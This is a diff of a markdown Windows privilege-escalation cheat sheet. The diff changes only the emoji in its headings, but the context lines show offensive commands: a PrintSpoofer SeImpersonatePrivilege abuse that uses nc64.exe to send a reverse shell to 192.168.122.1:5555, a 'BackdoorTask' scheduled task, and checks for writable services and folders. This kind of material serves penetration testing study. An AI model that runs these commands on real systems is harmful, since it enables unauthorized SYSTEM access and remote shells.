@@ -77,7 +77,7 @@ accesschk.exe /accepteula -dqv "C:\Python27"
 cacls "C:\Python27"
 ```
 
-# ⭐ Services ⭐ 
+# ⭐⭐ Services ⭐⭐ 
 - Is there a service that runs as SYSTEM but is writable by all logged-on users?  (NT AUTHORITY\INTERACTIVE)
 
 ## ⚠️Manage Service⚠️ 
@@ -200,7 +200,7 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService" -
 Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService"
 ```
 
-##  ⭐Scheduld Tasks⭐
+##  ⭐⭐Scheduld Tasks⭐⭐
 ```
 Get-ScheduledTask
 schtasks /query
@@ -218,13 +218,13 @@ Get-ScheduledTask -TaskName "XblGameSaveTask" | Format-List *
 Get-ScheduledTask | ForEach-Object { $_.Actions }
 ```
 
-## ⭐DLLs⭐
+## ⭐⭐DLLs⭐⭐
 ```
 🔺List out DLLs of a given service
 .\Listdlls64.exe /accepteula simpleService
 ```
 
-## ⭐Permissions⭐
+## ⭐⭐Permissions⭐⭐
 ```
 🔺 SeImpersonatePrivilege
 ./PrintSpoofer64.exe -c "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
@@ -264,7 +264,7 @@ schtasks /run /tn "BackdoorTask"
 
 ```
 
-# ⭐ Registry⭐
+# ⭐⭐ Registry⭐⭐
 
 ## ⚠️AutoRuns⚠️
 Run
